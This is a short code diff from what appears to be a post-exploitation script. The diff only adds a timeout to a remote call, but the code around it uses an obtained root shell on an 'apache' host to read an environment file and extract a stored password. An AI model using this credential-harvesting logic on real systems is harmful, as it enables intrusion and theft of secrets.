@@ -103,7 +103,7 @@ def run(root_shell, target_user=TARGET_USERNAME):
     # ------------------------------------------------------------------
     _search_noise_files(root_shell)
     log(f"[*] Reading {ENV_FILE_PATH} on apache...")
-    env_blob = run_remote(root_shell, f"cat {ENV_FILE_PATH}")
+    env_blob = run_remote(root_shell, f"cat {ENV_FILE_PATH}", timeout=10)
     password = _extract_password(env_blob)
     if not password:
         log(f"[-] No usable password variable found in {ENV_FILE_PATH}")
